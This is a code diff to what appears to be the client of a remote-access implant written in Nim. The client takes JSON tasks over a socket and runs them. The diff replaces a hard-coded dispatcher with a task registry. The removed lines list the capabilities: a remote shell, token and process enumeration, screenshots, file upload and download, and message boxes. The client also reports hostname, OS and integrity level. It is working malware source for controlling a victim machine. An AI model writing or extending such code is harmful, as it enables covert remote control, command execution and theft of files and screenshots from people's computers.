@@ -2,7 +2,7 @@ import net, base64, json, os
 
 import modules, communication
 
-import ../clientTasks/[shell, msgbox, download, tokinfo, processes, upload, screenshot]
+import ../clientTasks/index
 
 var client: Socket = newSocket()
 
@@ -30,9 +30,11 @@ proc receiveCommands(client: Socket) =
 
     let jsonNode = parseJson(task)
     let taskId = jsonNode["taskId"].getInt()
-
-    case jsonNode["task"].getStr():
-    of "identify":
+    var params: seq[string] = @[]
+    for param in jsonNode["data"]:
+      params.add param.getStr()
+    let taskName = jsonNode["task"].getStr()
+    if taskName == "identify":
       client.identify(
         taskId,
         hostname=hostname(),
@@ -43,27 +45,14 @@ proc receiveCommands(client: Socket) =
         linuxVersionInfo=getlinuxosinfo(),
         ownIntegrity=getintegrity()
       )
-    of "tokinfo":
-      tokinfo.executeTask(client, taskId, 
-        tokenGroups=getintegritygroups(),
-        tokenIntegrity=getintegrity()
-      )
-    of "processes":
-      processes.executeTask(client, taskId,
-        processes=getprocesses()
-      )
-    of "shell": 
-      let toExec = jsonNode["data"]["shellCmd"].getStr()
-      shell.executeTask(client, taskId, toExec)
-    of "msgbox":
-      msgbox.executeTask(client, taskId, jsonNode["data"]["title"].getStr(), jsonNode["data"]["caption"].getStr())
-    of "download":
-      download.executeTask(client, taskId, jsonNode["data"]["path"].getStr())
-    of "screenshot":
-      screenshot.executeTask(client, taskId)
-    of "upload":
-      upload.executeTask(client, taskId, jsonNode["data"]["contents"].getStr(), jsonNode["data"]["path"].getStr())
-
+    else:
+      var foundTask = false
+      for cTask in tasks:
+        if cTask.name == taskName:
+          foundTask = true
+          cTask.execute(client, taskId, params)
+      if not foundTask:
+        client.unknownTask(taskId, jsonNode["task"].getStr())
 
 while true:
   try:
